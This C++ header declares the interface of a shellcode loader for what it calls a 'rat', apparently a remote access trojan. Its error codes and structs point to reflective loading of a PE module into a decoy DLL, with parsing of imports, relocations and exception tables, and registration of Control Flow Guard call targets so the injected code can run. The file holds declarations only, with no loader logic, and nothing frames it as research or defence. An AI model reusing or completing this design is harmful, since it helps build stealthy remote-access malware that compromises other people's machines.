// shellcode.hpp is the shellcode's public interface. It should only contain
// information about its exported functions for consumers.
# pragma once
#include <rat.hpp>
#include <cstddef>
#include <phnt.h>

using rat_export_t = decltype(&run);

#pragma pack(push, 1)
typedef struct _IMAGE_CFG_ENTRY
{
    ULONG Rva;
    struct
    {
        BOOLEAN SuppressedCall : 1;
        BOOLEAN ExportSuppressed : 1;
        BOOLEAN LangExcptHandler : 1;
        BOOLEAN Xfg : 1;
        BOOLEAN Reserved : 4;
    };
} IMAGE_CFG_ENTRY, * PIMAGE_CFG_ENTRY;
#pragma pack(pop)

// Add error enum
enum class error {
    SUCCESS,
    NTDLL,
    KERNEL32,
    KERNELBASE,
    DECOYDLL,
    VIRTUALALLOC,
    GETMODULEHANDLEA,
    LOADLIBRARYA,
    GETPROCADDRESS,
    VIRTUALPROTECT,
    FLUSHINSTRUCTIONCACHE,
    RTLADDFUNCTIONTABLE,
    SETPROCESSVALIDCALLTARGETS,
    FAIL_ALLOCATION,
    FAIL_LOAD_LIBRARY,
    FAIL_GET_PROC,
    FAIL_PROTECT,
    FAIL_FLUSH_CACHE,
    FAIL_ADD_FUNCTION_TABLE,
    RATEXPORT
};

using dll_main_t = BOOL(*) (HINSTANCE, DWORD, LPVOID);

struct shellcode_result {
    error err;
    const char* err_string;
    rat_export_t func;
    std::byte* module_base;
    size_t module_size;
    std::byte* og_headers;
    size_t og_headers_size;
    dll_main_t dll_main;
};

struct headers {
    std::byte* base{ nullptr };
    uintptr_t va{ 0 };
    PIMAGE_DOS_HEADER dos{ nullptr };
    PIMAGE_NT_HEADERS nt{ nullptr };
    PIMAGE_OPTIONAL_HEADER opt{ nullptr };
    PIMAGE_FILE_HEADER file{ nullptr };
    PIMAGE_DATA_DIRECTORY data{ nullptr };
    size_t size{ 0 };
};

struct data_dirs {
    PIMAGE_BASE_RELOCATION relocations{ nullptr };
    PIMAGE_IMPORT_DESCRIPTOR imports{ nullptr };
    PIMAGE_EXPORT_DIRECTORY exports{ nullptr };
    PIMAGE_LOAD_CONFIG_DIRECTORY load_config{ nullptr };
    PIMAGE_TLS_DIRECTORY tls{ nullptr };
    PIMAGE_RUNTIME_FUNCTION_ENTRY exceptions{ nullptr };
    unsigned long exceptions_size{ 0 };
};

data_dirs parse_data(headers pe);
headers parse_headers(void* base);

extern "C"
shellcode_result entry();
using shellcode_t = decltype(&entry);